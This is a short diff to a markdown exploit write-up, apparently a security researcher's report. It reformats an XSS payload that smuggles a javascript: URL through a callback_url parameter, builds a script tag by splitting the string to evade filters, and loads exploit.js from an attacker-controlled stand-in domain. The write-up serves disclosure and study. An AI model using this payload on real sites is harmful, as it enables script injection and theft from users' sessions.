@@ -111,7 +111,8 @@ However, this payload encountered encoding issues and was excessively long.
 We refined our approach by injecting a script element that loads our exploit from an external source:
 
 ```
-https://example.com/social-ads/?callback_url=javascript:d=document;a='scr';b='ipt';s=d.createElement?.(a%2Bb);s.src='https://DOMAIN_WE_CONTROL/exploit.js';d.body.appendChild?.(s)
+https://example.com/social-ads/?callback_url=javascript:d=document;a='scr';b='ipt';
+s=d.createElement?.(a%2Bb);s.src='https://DOMAIN_WE_CONTROL/exploit.js';d.body.appendChild?.(s)
 ```
 
 ### Final Exploit Code
